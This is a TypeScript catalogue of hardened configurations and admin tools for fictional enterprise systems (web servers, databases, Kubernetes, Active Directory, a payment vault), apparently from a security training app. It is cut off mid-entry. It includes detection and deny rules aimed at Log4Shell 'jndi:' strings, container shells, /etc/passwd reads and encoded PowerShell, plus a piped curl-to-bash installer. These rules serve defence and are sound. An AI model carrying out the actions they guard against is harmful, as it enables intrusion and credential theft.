export interface AssociatedToolDetail {
  name: string;
  version: string;
  installationCommand: string;
  configExample: string;
  configLanguage?: string;
  exampleUsage: string;
  usageLanguage?: string;
  description?: string;
}

export interface SystemTechnicalDetail {
  systemId: string;
  systemName: string;
  codeLanguage: string;
  codeFileName: string;
  exampleCode: string;
  codeExplanation: string;
  tools: AssociatedToolDetail[];
}

export interface BugTechnicalDetail {
  bugId: string;
  bugName: string;
  targetSoftwareId: string;
  codeLanguage: string;
  codeFileName: string;
  buggyCode: string;
  errorMessage: string;
  rootCause: string;
  correctedCode: string;
  fixExplanation: string;
  exploitScript?: string;
}

export const TECHNICAL_SYSTEMS_CATALOG: Record<string, SystemTechnicalDetail> = {
  'Computer 01': {
    systemId: 'Computer 01',
    systemName: 'Computer 01 (WEB-COMP-01)',
    codeLanguage: 'nginx',
    codeFileName: '/etc/nginx/sites-available/ecommerce.conf',
    codeExplanation: 'Nginx reverse proxy and Node.js microservice upstream configuration for the E-Commerce Web Application on Ubuntu 24.04.',
    exampleCode: `# Production Nginx Reverse Proxy - Computer 01 (WEB-COMP-01)
server {
    listen 443 ssl http2;
    server_name shop.enterprise.internal;

    ssl_certificate /etc/ssl/certs/ecommerce.crt;
    ssl_certificate_key /etc/ssl/private/ecommerce.key;
    ssl_protocols TLSv1.2 TLSv1.3;

    # Rate limiting & security headers
    limit_req zone=checkout_zone burst=20 nodelay;
    add_header X-Frame-Options "DENY";
    add_header X-Content-Type-Options "nosniff";

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_cache_bypass $http_upgrade;
    }

    location /api/catalog {
        proxy_pass http://192.168.10.105:8000;
        proxy_connect_timeout 3s;
    }
}`,
    tools: [
      {
        name: 'certbot',
        version: 'v2.9.0',
        description: 'Automated Let’s Encrypt certificate renewal daemon.',
        installationCommand: 'sudo apt-get install -y certbot python3-certbot-nginx',
        configLanguage: 'ini',
        configExample: `rsa-key-size = 4096\nemail = webops@enterprise.internal`,
        usageLanguage: 'bash',
        exampleUsage: 'sudo certbot renew --dry-run'
      },
      {
        name: 'pm2',
        version: 'v5.3.1',
        description: 'Production process manager for Node.js e-commerce cluster.',
        installationCommand: 'npm install -g pm2',
        configLanguage: 'javascript',
        configExample: `module.exports = { apps: [{ name: "ecommerce-web", script: "./server.js", instances: "max", env: { NODE_ENV: "production" } }] };`,
        usageLanguage: 'bash',
        exampleUsage: 'pm2 status && pm2 monit'
      }
    ]
  },

  'Computer 07': {
    systemId: 'Customer Database',
    systemName: 'Computer 07 (DB-COMP-07)',
    codeLanguage: 'sql',
    codeFileName: '/etc/postgresql/16/main/customer_query_handler.sql',
    codeExplanation: 'PostgreSQL 16.2 database schema and query procedures for relational customer accounts on Computer 07 (192.168.10.107:5432).',
    exampleCode: `-- Production Customer Database Schema - Computer 07 (DB-COMP-07)
CREATE TABLE customer_accounts (
    id SERIAL PRIMARY KEY,
    account_num VARCHAR(32) UNIQUE NOT NULL,
    full_name VARCHAR(128) NOT NULL,
    email VARCHAR(128) NOT NULL,
    account_balance NUMERIC(12, 2) DEFAULT 0.00,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    active BOOLEAN DEFAULT TRUE
);

-- Index for high-throughput indexed lookups
CREATE INDEX idx_customers_account ON customer_accounts(account_num);

-- Secure parameterized search procedure
CREATE OR REPLACE FUNCTION get_customer_by_account(p_account TEXT)
RETURNS SETOF customer_accounts AS $$
BEGIN
    RETURN QUERY EXECUTE 
        'SELECT * FROM customer_accounts WHERE account_num = $1 AND active = TRUE'
        USING p_account;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;`,
    tools: [
      {
        name: 'psql',
        version: 'v16.2',
        description: 'PostgreSQL command-line client and query inspection terminal.',
        installationCommand: 'sudo apt-get install -y postgresql-client-16',
        configLanguage: 'ini',
        configExample: `\\set ON_ERROR_STOP on\n\\timing on`,
        usageLanguage: 'bash',
        exampleUsage: 'psql -h 192.168.10.107 -U postgres -d customer_db -c "SELECT count(*) FROM customer_accounts;"'
      },
      {
        name: 'pg_top',
        version: 'v4.0.0',
        description: 'Top-like utility showing PostgreSQL active queries and buffer cache hit ratio.',
        installationCommand: 'sudo apt-get install -y pg-top',
        configLanguage: 'bash',
        configExample: `export PGDATABASE=customer_db`,
        usageLanguage: 'bash',
        exampleUsage: 'pg_top -h 192.168.10.107 -U postgres'
      }
    ]
  },

  'Computer 14': {
    systemId: 'Employee Management',
    systemName: 'Computer 14 (EMP-COMP-14)',
    codeLanguage: 'java',
    codeFileName: '/opt/employeemgmt/src/EmployeeSearchController.java',
    codeExplanation: 'Spring Boot 2.7.0 enterprise employee directory and REST controller on Computer 14 (192.168.10.114:8080).',
    exampleCode: `package com.enterprise.employeemgmt.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import javax.validation.constraints.Pattern;

@RestController
@RequestMapping("/api/v1/employees")
public class EmployeeSearchController {
    private static final Logger logger = LogManager.getLogger(EmployeeSearchController.class);

    @GetMapping("/search")
    public ResponseEntity<EmployeeRecord> searchEmployee(
        @RequestParam("id") @Pattern(regexp = "^EMP-[0-9]{5}$") String employeeId
    ) {
        // Parameterized logging with regex boundary enforcement
        logger.info("Audit search request for employee ID: {}", employeeId);
        EmployeeRecord record = employeeService.findEmployeeById(employeeId);
        return ResponseEntity.ok(record);
    }
}`,
    tools: [
      {
        name: 'jcmd',
        version: 'OpenJDK 17',
        description: 'JVM diagnostic command utility inspecting thread dumps and heap info.',
        installationCommand: 'sudo apt-get install -y openjdk-17-jdk',
        configLanguage: 'bash',
        configExample: `# JVM Heap inspection`,
        usageLanguage: 'bash',
        exampleUsage: 'jcmd $(pgrep java) GC.heap_info'
      },
      {
        name: 'visualvm',
        version: 'v2.1.8',
        description: 'Visual Java profiling and thread lock monitor.',
        installationCommand: 'sudo snap install visualvm',
        configLanguage: 'properties',
        configExample: `visualvm.jmx.port=9010`,
        usageLanguage: 'bash',
        exampleUsage: 'visualvm --openpid $(pgrep java)'
      }
    ]
  },

  'Computer 21': {
    systemId: 'Internal Analytics API',
    systemName: 'Computer 21 (API-COMP-21)',
    codeLanguage: 'python',
    codeFileName: '/opt/analytics/analytics_report_generator.py',
    codeExplanation: 'Python 3.11 / Flask analytics aggregation microservice on Computer 21 (192.168.10.121:5000).',
    exampleCode: `# Production Analytics Microservice - Computer 21 (API-COMP-21)
from flask import Flask, request, render_template, jsonify
import re

app = Flask(__name__)

ALLOWED_METRICS = {
    "DailyTraffic": "Daily Web Visitors & Sessions",
    "RevenueGrowth": "Weekly Transaction Volume",
    "ServerLoad": "Mean System CPU & Memory Utilization",
    "ChurnRate": "Monthly Account Retention Metrics"
}

@app.route('/api/analytics/report')
def generate_report():
    raw_metric = request.args.get('metric', 'DailyTraffic')
    # Whitelist input validation preventing SSTI syntax evaluation
    metric_key = raw_metric if raw_metric in ALLOWED_METRICS else "DailyTraffic"
    metric_desc = ALLOWED_METRICS[metric_key]
    
    return render_template('report.html', metric=metric_key, description=metric_desc)

@app.route('/healthz')
def health_check():
    return jsonify({"status": "HEALTHY", "host": "API-COMP-21", "engine": "Flask/Gunicorn"})

if __name__ == '__main__':
    app.run(host='192.168.10.121', port=5000)`,
    tools: [
      {
        name: 'gunicorn',
        version: 'v21.2.0',
        description: 'Python WSGI HTTP server running analytics worker processes.',
        installationCommand: 'pip3 install gunicorn',
        configLanguage: 'python',
        configExample: `workers = 4\nbind = "192.168.10.121:5000"\ntimeout = 30`,
        usageLanguage: 'bash',
        exampleUsage: 'gunicorn -c gunicorn.conf.py analytics_report_generator:app'
      },
      {
        name: 'pytest',
        version: 'v8.0.2',
        description: 'Automated test suite verifying endpoint security and input sanitation.',
        installationCommand: 'pip3 install pytest',
        configLanguage: 'ini',
        configExample: `[pytest]\naddopts = -v --tb=short`,
        usageLanguage: 'bash',
        exampleUsage: 'pytest tests/test_security_sanitization.py'
      }
    ]
  },
  'Apache Web Server': {
    systemId: 'Apache Web Server',
    systemName: 'Apache Web Server',
    codeLanguage: 'apache',
    codeFileName: '/etc/apache2/sites-available/production.conf',
    codeExplanation: 'Production Apache 2.4 VirtualHost with TLS 1.3 encryption, hardened security headers (HSTS, CSP, X-Frame-Options), and reverse proxy pass-through to internal application services.',
    exampleCode: `# Production Apache 2.4 Reverse Proxy & Web Server Configuration
<VirtualHost *:443>
    ServerName web.enterprise.internal
    ServerAdmin sysadmin@enterprise.internal
    DocumentRoot /var/www/html

    # Hardened TLS / SSL Configuration
    SSLEngine on
    SSLProtocol -all +TLSv1.2 +TLSv1.3
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
    SSLHonorCipherOrder off
    SSLCertificateFile /etc/ssl/certs/enterprise.crt
    SSLCertificateKeyFile /etc/ssl/private/enterprise.key

    # Strict Enterprise Security Headers
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
    Header always set Content-Security-Policy "default-src 'self'; frame-ancestors 'none';"

    # Reverse Proxy Ingress to Microservice Cluster
    ProxyRequests Off
    ProxyPreserveHost On
    ProxyPass /api/ http://10.0.3.50:8080/api/ retry=1 timeout=5
    ProxyPassReverse /api/ http://10.0.3.50:8080/api/

    # Access Logging with Microsecond Latency Tracking
    CustomLog \${APACHE_LOG_DIR}/access_combined.log "%h %l %u %t \\"%r\\" %>s %b %D"
    ErrorLog \${APACHE_LOG_DIR}/error_secure.log
</VirtualHost>`,
    tools: [
      {
        name: 'mod_security',
        version: 'v3.0.8',
        description: 'Web Application Firewall (WAF) module for Apache HTTP Server inspecting HTTP request payloads.',
        installationCommand: 'sudo apt-get update && sudo apt-get install -y libapache2-mod-security2 modsecurity-crs',
        configLanguage: 'apache',
        configExample: `# /etc/apache2/mods-enabled/security2.conf
<IfModule security2_module>
    SecRuleEngine On
    SecRequestBodyAccess On
    SecResponseBodyAccess Off
    SecRule REQUEST_HEADERS:User-Agent "@contains jndi:" "id:1001,phase:1,deny,status:403,log,msg:'JNDI Exploit Blocked'"
    IncludeOptional /usr/share/modsecurity-crs/*.conf
</IfModule>`,
        usageLanguage: 'bash',
        exampleUsage: `# Verify Apache configuration syntax and inspect audit log
sudo apachectl configtest
sudo tail -f /var/log/apache2/modsec_audit.log`
      },
      {
        name: 'certbot',
        version: 'v2.9.0',
        description: 'Automated ACME client for provisioning and renewing Let’s Encrypt TLS/SSL certificates.',
        installationCommand: 'sudo snap install --classic certbot && sudo ln -s /snap/bin/certbot /usr/bin/certbot',
        configLanguage: 'ini',
        configExample: `# /etc/letsencrypt/cli.ini
rsa-key-size = 4096
authenticator = apache
installer = apache
agree-tos = true
email = security@enterprise.internal`,
        usageLanguage: 'bash',
        exampleUsage: `# Request and install TLS certificate automatically for Apache vhost
sudo certbot --apache -d web.enterprise.internal --non-interactive`
      },
      {
        name: 'fail2ban',
        version: 'v1.0.2',
        description: 'Intrusion prevention framework monitoring Apache error logs to block brute-force scanners.',
        installationCommand: 'sudo apt-get install -y fail2ban iptables',
        configLanguage: 'ini',
        configExample: `# /etc/fail2ban/jail.d/apache-auth.local
[apache-auth]
enabled = true
port = http,https
filter = apache-auth
logpath = /var/log/apache2/error*.log
maxretry = 5
findtime = 600
bantime = 3600`,
        usageLanguage: 'bash',
        exampleUsage: `# Check current status and banned IP list
sudo fail2ban-client status apache-auth`
      },
      {
        name: 'iptables',
        version: 'v1.8.7',
        description: 'Kernel-level netfilter packet filter managing inbound HTTP/HTTPS firewall rules.',
        installationCommand: 'sudo apt-get install -y iptables iptables-persistent',
        configLanguage: 'bash',
        configExample: `# /etc/iptables/rules.v4 - allow web ports, drop invalid
*filter
:INPUT DROP [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
-A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT
-A INPUT -i lo -j ACCEPT
COMMIT`,
        usageLanguage: 'bash',
        exampleUsage: `# Load and verify active firewall filtering rules
sudo netfilter-persistent reload && sudo iptables -L -v -n`
      },
      {
        name: 'htop',
        version: 'v3.2.2',
        description: 'Interactive system monitor for tracking Apache worker threads, memory footprint, and CPU load.',
        installationCommand: 'sudo apt-get install -y htop',
        configLanguage: 'ini',
        configExample: `# ~/.config/htop/htoprc
fields=0 48 17 18 38 39 40 2 46 47 49 1
sort_key=46
sort_direction=1
hide_userland_threads=0`,
        usageLanguage: 'bash',
        exampleUsage: `# Filter live process tree exclusively for Apache daemon workers
htop -u www-data`
      }
    ]
  },

  'MS Exchange': {
    systemId: 'MS Exchange',
    systemName: 'MS Exchange Server',
    codeLanguage: 'powershell',
    codeFileName: 'ExchangeMailRoutingConfig.ps1',
    codeExplanation: 'Microsoft Exchange PowerShell script establishing outbound send connectors with forced TLS authentication, message hygiene rules, and audit log enforcement.',
    exampleCode: `# PowerShell Exchange Management Shell (EMS) Mail Transport Configuration
Import-Module ExchangeServer

# 1. Enforce TLS 1.2 on Edge and Hybrid Inbound/Outbound Connectors
Set-TransportConfig -TlsReceiveDomainCapabilities "enterprise.internal:AcceptOorgProtocol"

# 2. Configure Secure Outbound Smart Host Send Connector
New-SendConnector -Name "Hybrid Outbound TLS" \`
    -Usage Internet \`
    -AddressSpaces "SMTP:*;1" \`
    -IsScopedConnector $false \`
    -DNSRoutingEnabled $false \`
    -SmartHosts "smtp.enterprise-relay.internal" \`
    -SmartHostAuthMechanism BasicAuth \`
    -RequireTLS $true \`
    -TlsAuthLevel CertificateValidation \`
    -TlsDomain "enterprise-relay.internal"

# 3. Enable Transport Hygiene Rule for Malicious Attachments
New-TransportRule -Name "Block Executable & Macro Payloads" \`
    -Priority 0 \`
    -AttachmentHasExecutableContent $true \`
    -RejectMessageReasonText "Inbound policy rejected: Executable attachments prohibited." \`
    -SenderAddressLocation HeaderOrEnvelope \`
    -Mode Enforce`,
    tools: [
      {
        name: 'Exchange Admin Center',
        version: 'v2019 CU12',
        description: 'Web-based management console for Exchange Server mailbox provisioning and connector administration.',
        installationCommand: 'Setup.exe /Mode:Upgrade /IAcceptExchangeServerLicenseTerms_DiagnosticDataON',
        configLanguage: 'xml',
        configExample: `<!-- C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\web.config -->
<configuration>
  <system.webServer>
    <security>
      <ipSecurity allowUnlisted="false">
        <add ipAddress="10.0.1.0" subnetMask="255.255.255.0" allowed="true"/>
      </ipSecurity>
    </security>
  </system.webServer>
</configuration>`,
        usageLanguage: 'powershell',
        exampleUsage: `# Verify Exchange Control Panel (ECP) virtual directory settings
Get-EcpVirtualDirectory | Select Server, Name, InternalUrl, ExternalUrl`
      },
      {
        name: 'PowerShell EMS',
        version: 'v15.2',
        description: 'Exchange Management Shell command-line interface for automating directory and mail transport tasks.',
        installationCommand: 'Install-WindowsFeature RSAT-Clustering-Powershell',
        configLanguage: 'powershell',
        configExample: `# EMS Profile setup
$FormatEnumerationLimit = -1
$PSSessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck`,
        usageLanguage: 'powershell',
        exampleUsage: `# Audit all transport rules and quarantine hold queues
Get-TransportRule | Format-Table Name, State, Priority`
      },
      {
        name: 'Windows Defender',
        version: 'v4.18.24080',
        description: 'Endpoint protection agent providing real-time anti-malware and memory inspection on Windows Server.',
        installationCommand: 'Install-WindowsFeature Windows-Defender, Windows-Defender-GUI',
        configLanguage: 'powershell',
        configExample: `# Set Microsoft Exchange process exclusions in Windows Defender
Add-MpPreference -ExclusionPath "C:\\Program Files\\Microsoft\\Exchange Server\\V15"
Add-MpPreference -ExclusionProcess "MSExchangeMailboxAssistants.exe", "EdgeTransport.exe"`,
        usageLanguage: 'powershell',
        exampleUsage: `# Verify Defender engine status and signature database version
Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, AntivirusSignatureAge`
      }
    ]
  },

  'Customer DB': {
    systemId: 'Customer DB',
    systemName: 'MySQL DB',
    codeLanguage: 'sql',
    codeFileName: '/etc/mysql/mysql.conf.d/mysqld.cnf & schema.sql',
    codeExplanation: 'High-concurrency MySQL database initialization script featuring strict ACID transaction isolation, connection pool settings, and encrypted customer data schemas.',
    exampleCode: `-- Production Customer Database Schema & Pool Initialization
CREATE DATABASE IF NOT EXISTS customer_db 
  CHARACTER SET utf8mb4 
  COLLATE utf8mb4_unicode_ci;

USE customer_db;

CREATE TABLE IF NOT EXISTS customer_accounts (
    account_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    customer_uuid VARCHAR(36) NOT NULL UNIQUE,
    full_name VARCHAR(128) NOT NULL,
    email VARCHAR(255) NOT NULL UNIQUE,
    account_balance DECIMAL(14, 2) NOT NULL DEFAULT 0.00,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_customer_email (email),
    INDEX idx_customer_uuid (customer_uuid)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Atomic Transaction Execution for Customer Funds Transfer
DELIMITER //
CREATE PROCEDURE TransferFunds(
    IN source_uuid VARCHAR(36),
    IN target_uuid VARCHAR(36),
    IN transfer_amount DECIMAL(14, 2)
)
BEGIN
    DECLARE EXIT HANDLER FOR SQLEXCEPTION
    BEGIN
        ROLLBACK;
        RESIGNAL;
    END;

    START TRANSACTION;
    UPDATE customer_accounts 
    SET account_balance = account_balance - transfer_amount 
    WHERE customer_uuid = source_uuid AND account_balance >= transfer_amount;

    UPDATE customer_accounts 
    SET account_balance = account_balance + transfer_amount 
    WHERE customer_uuid = target_uuid;
    COMMIT;
END //
DELIMITER ;`,
    tools: [
      {
        name: 'Percona Toolkit',
        version: 'v3.5.7',
        description: 'Advanced command-line diagnostics suite for MySQL query optimization and table checksums.',
        installationCommand: 'sudo apt-get install -y percona-toolkit',
        configLanguage: 'ini',
        configExample: `# ~/.percona-toolkit.conf
history-table=percona_schema.query_history
create-history-table=yes
output=json`,
        usageLanguage: 'bash',
        exampleUsage: `# Profile slow query log to identify high-latency lock contentions
pt-query-digest /var/log/mysql/mysql-slow.log`
      },
      {
        name: 'mysqldump',
        version: 'v8.0.32',
        description: 'Native backup and database schema replication utility for MySQL relational stores.',
        installationCommand: 'sudo apt-get install -y mysql-client',
        configLanguage: 'ini',
        configExample: `# ~/.my.cnf
[mysqldump]
quick=true
single-transaction=true
max_allowed_packet=512M`,
        usageLanguage: 'bash',
        exampleUsage: `# Create transaction-consistent snapshot without locking tables
mysqldump -u root -p --single-transaction --routines customer_db > customer_backup.sql`
      },
      {
        name: 'AppArmor',
        version: 'v3.0.8',
        description: 'Mandatory Access Control (MAC) profile confining mysqld filesystem and network access.',
        installationCommand: 'sudo apt-get install -y apparmor apparmor-utils',
        configLanguage: 'ini',
        configExample: `# /etc/apparmor.d/usr.sbin.mysqld
/usr/sbin/mysqld {
  #include <tunables/global>
  /var/lib/mysql/ r,
  /var/lib/mysql/** rwk,
  /var/log/mysql/ rw,
  /var/log/mysql/** rwk,
  deny /etc/passwd r,
  deny /bin/sh rx,
}`,
        usageLanguage: 'bash',
        exampleUsage: `# Enforce strict confinement profile for MySQL daemon
sudo aa-enforce /etc/apparmor.d/usr.sbin.mysqld && sudo aa-status`
      },
      {
        name: 'mytop',
        version: 'v1.9.1',
        description: 'Top-like console monitor displaying real-time queries, connections, and thread activity for MySQL.',
        installationCommand: 'sudo apt-get install -y mytop',
        configLanguage: 'ini',
        configExample: `# ~/.mytop
host=localhost
db=customer_db
delay=2
port=3306`,
        usageLanguage: 'bash',
        exampleUsage: `# Launch real-time thread activity visualizer
mytop -u root -p -d customer_db`
      }
    ]
  },

  'K8s Cluster': {
    systemId: 'K8s Cluster',
    systemName: 'Kubernetes Cluster',
    codeLanguage: 'yaml',
    codeFileName: 'k8s-microservices-deployment.yaml',
    codeExplanation: 'Production Kubernetes v1.28 deployment specification containing pod security contexts, resource requests/limits, readiness/liveness probes, and Envoy Ingress routing.',
    exampleCode: `apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-processing-service
  namespace: production
  labels:
    app: payment-api
    tier: microservice
spec:
  replicas: 3
  selector:
    matchLabels:
      app: payment-api
  template:
    metadata:
      labels:
        app: payment-api
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        fsGroup: 10001
      containers:
      - name: payment-api
        image: enterprise/payment-api:v2.4.0
        ports:
        - containerPort: 8080
          name: http
        resources:
          limits:
            cpu: "1000m"
            memory: "512Mi"
          requests:
            cpu: "250m"
            memory: "256Mi"
        readinessProbe:
          httpGet:
            path: /health/ready
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 10
        livenessProbe:
          httpGet:
            path: /health/live
            port: 8080
          initialDelaySeconds: 15
          periodSeconds: 20
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop: ["ALL"]`,
    tools: [
      {
        name: 'kubectl',
        version: 'v1.28.2',
        description: 'Primary command-line interface for communicating with the Kubernetes API server.',
        installationCommand: 'curl -LO "https://dl.k8s.io/release/v1.28.2/bin/linux/amd64/kubectl" && sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl',
        configLanguage: 'yaml',
        configExample: `# ~/.kube/config
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0t...
    server: https://10.0.3.50:6443
  name: production-cluster`,
        usageLanguage: 'bash',
        exampleUsage: `# Inspect all pods and node health across production namespace
kubectl get pods -n production -o wide`
      },
      {
        name: 'Calico CNI',
        version: 'v3.26.1',
        description: 'Container Network Interface (CNI) provider enforcing zero-trust microsegmentation network policies.',
        installationCommand: 'kubectl apply -f https://raw.githubusercontent.com/projectcalico/calico/v3.26.1/manifests/calico.yaml',
        configLanguage: 'yaml',
        configExample: `apiVersion: projectcalico.org/v3
kind: GlobalNetworkPolicy
metadata:
  name: deny-unmatched-ingress
spec:
  order: 1000
  types:
  - Ingress
  ingress:
  - action: Allow
    protocol: TCP
    destination:
      ports: [8080, 443]`,
        usageLanguage: 'bash',
        exampleUsage: `# Inspect active Calico network endpoints and security rules
calicoctl get endpoints -o wide`
      },
      {
        name: 'Falco Runtime Security',
        version: 'v0.36.2',
        description: 'Cloud-native runtime threat detection engine monitoring Linux kernel syscalls in containers.',
        installationCommand: 'helm repo add falcosecurity https://falcosecurity.github.io/charts && helm install falco falcosecurity/falco',
        configLanguage: 'yaml',
        configExample: `# /etc/falco/falco_rules.local.yaml
- rule: Unauthorized Shell in Container
  desc: Detect bash or sh spawned within a production pod
  condition: container.id != host and proc.name in (bash, sh, zsh)
  output: "Notice: Shell spawned in container (user=%user.name container=%container.info)"
  priority: WARNING`,
        usageLanguage: 'bash',
        exampleUsage: `# Stream runtime behavioral alerts detected by Falco
sudo journalctl -u falco -f`
      },
      {
        name: 'Helm',
        version: 'v3.13.0',
        description: 'Package manager for Kubernetes managing chart repositories and reproducible deployments.',
        installationCommand: 'curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash',
        configLanguage: 'yaml',
        configExample: `# values.yaml overrides
replicaCount: 3
ingress:
  enabled: true
  className: "nginx"`,
        usageLanguage: 'bash',
        exampleUsage: `# Upgrade production deployment using Helm release chart
helm upgrade --install payment-api ./charts/payment-api -n production`
      }
    ]
  },

  'Windows DC': {
    systemId: 'Windows DC',
    systemName: 'Windows Domain Controller',
    codeLanguage: 'powershell',
    codeFileName: 'ActiveDirectoryForestHarden.ps1',
    codeExplanation: 'Active Directory Domain Services PowerShell script configuring Kerberos ticket lifetimes, AES-256 encryption enforcement, and directory service auditing.',
    exampleCode: `# Active Directory Domain Controller Hardening & Policy Initialization
Import-Module ActiveDirectory

# 1. Enforce Domain-Wide Kerberos Ticket Policy
Set-ADDefaultDomainPasswordPolicy -Identity "enterprise.internal" \`
    -MinPasswordLength 16 \`
    -ComplexityEnabled $true \`
    -LockoutThreshold 5 \`
    -LockoutDuration (New-TimeSpan -Minutes 30) \`
    -LockoutObservationWindow (New-TimeSpan -Minutes 30)

# 2. Configure Advanced Audit Policy for Kerberos Authentication
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable

# 3. Create Restricted Administrative Tier (Tier 0) Security Group
$T0AdminGroup = New-ADGroup -Name "T0-Domain-Controllers" \`
    -GroupScope Global \`
    -GroupCategory Security \`
    -Path "OU=Tier0,DC=enterprise,DC=internal" \`
    -Description "Restricted administrative identities authorized for Domain Controller tier only"

# 4. Enforce AES-256 Cryptographic Encodings for Computer Accounts
Get-ADComputer -Filter * | Set-ADComputer -KerberosEncryptionType AES128,AES256`,
    tools: [
      {
        name: 'RSAT',
        version: 'v10.0',
        description: 'Remote Server Administration Tools managing Active Directory Users, Computers, and DNS.',
        installationCommand: 'Get-WindowsCapability -Name Rsat.ActiveDirectory* -Online | Add-WindowsCapability -Online',
        configLanguage: 'powershell',
        configExample: `# RSAT Active Directory module setup
Import-Module ActiveDirectory
$ADServer = "DC01.enterprise.internal"`,
        usageLanguage: 'powershell',
        exampleUsage: `# Query high-privilege Domain Admins and last logon timestamps
Get-ADGroupMember -Identity "Domain Admins" | Get-ADUser -Properties LastLogonDate`
      },
      {
        name: 'Group Policy Management',
        version: 'v10.0',
        description: 'GPMC console for auditing, authoring, and deploying centralized security policies across forest.',
        installationCommand: 'Install-WindowsFeature GPMC',
        configLanguage: 'powershell',
        configExample: `# Backup and audit Default Domain Controllers Policy
Backup-GPO -Name "Default Domain Controllers Policy" -Path "C:\\GPOBackups"`,
        usageLanguage: 'powershell',
        exampleUsage: `# Enforce group policy refresh on client workstations
gpupdate /force && gpresult /H C:\\gpreport.html`
      },
      {
        name: 'Mimikatz Detector',
        version: 'v2.2.0',
        description: 'Behavioral detection script analyzing LSASS memory dumps and suspicious Kerberos ticket requests.',
        installationCommand: 'Install-Module -Name ThreatHunting -Force',
        configLanguage: 'powershell',
        configExample: `# Audit Security Event Log for Mimikatz artifact signatures (Event 4672, 4624)
$Filter = @{ LogName='Security'; Id=4624; StartTime=(Get-Date).AddHours(-24) }`,
        usageLanguage: 'powershell',
        exampleUsage: `# Scan Active Directory events for pass-the-hash patterns
Get-WinEvent -FilterHashtable $Filter | Where-Object { $_.Properties[8].Value -eq 9 }`
      },
      {
        name: 'Sysmon',
        version: 'v15.11',
        description: 'System Monitor driver capturing low-level process creation, network sockets, and file hashes on Windows.',
        installationCommand: 'Invoke-WebRequest -Uri "https://live.sysinternals.com/sysmon64.exe" -OutFile "sysmon64.exe" && .\\sysmon64.exe -accepteula -i sysmonconfig.xml',
        configLanguage: 'xml',
        configExample: `<!-- sysmonconfig.xml - SwiftOnSecurity baseline -->
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <Image condition="contains">powershell.exe</Image>
      <CommandLine condition="contains">-enc</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>`,
        usageLanguage: 'powershell',
        exampleUsage: `# Read latest process creation telemetry registered by Sysmon
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 20`
      }
    ]
  },

  'Payment Gateway': {
    systemId: 'Payment Gateway',
    systemName: 'Payment Gateway',
    codeLanguage: 'typescript',
    codeFileName: 'paymentVaultService.ts',
    codeExplanation: 'PCI-DSS Level 1 compliant TypeScript payment authorization service utilizing AES-256-GCM tokenization, cryptographically secure nonce verification, and ModSecurity WAF protection.',
    exampleCode: `import crypto from 'crypto';

interface EncryptedCardVault {
  token: string;
  iv: string;
  authTag: string;
  lastFour: string;
}

export class PaymentVaultService {
  private readonly algorithm = 'aes-256-gcm';
  private readonly hsmMasterKey: Buffer;

  constructor(masterKeyHex: string) {
    this.hsmMasterKey = Buffer.from(masterKeyHex, 'hex');
  }

  // Tokenize PAN into PCI-compliant vault storage
  public tokenizeCard(primaryAccountNumber: string): EncryptedCardVault {
    const iv = crypto.randomBytes(12); // 96-bit nonce for GCM
    const cipher = crypto.createCipheriv(this.algorithm, this.hsmMasterKey, iv);

    const encrypted = Buffer.concat([
      cipher.update(primaryAccountNumber, 'utf8'),
      cipher.final()
    ]);
    const authTag = cipher.getAuthTag();

    const lastFour = primaryAccountNumber.slice(-4);
    const token = 'tok_' + crypto.randomBytes(16).toString('hex');

    return {
      token,
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
      lastFour
    };
  }

  // Authorize settlement payload with digital HMAC signature
  public signPayload(payload: object, merchantSecret: string): string {
    const hmac = crypto.createHmac('sha256', merchantSecret);
    hmac.update(JSON.stringify(payload));
    return hmac.digest('hex');
  }
}`,
    tools: [
      {
        name: 'HSM Cryptoki',
        version: 'v2.40',
        description: 'Hardware Security Module (HSM) PKCS#11 driver for managing AES-256 vault keys in isolated hardware.',
        installationCommand: 'sudo apt-get install -y opensc libpkcs11-helper1 softhsm2',
        configLanguage: 'ini',
        configExample: `# /etc/softhsm/softhsm2.conf
directories.tokendir = /var/lib/softhsm/tokens/
objectstore.backend = file
log.level = INFO`,
        usageLanguage: 'bash',
        exampleUsage: `# Query HSM cryptographic slot and active token storage
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so --show-info`
      },
      {
        name: 'ModSecurity WAF',
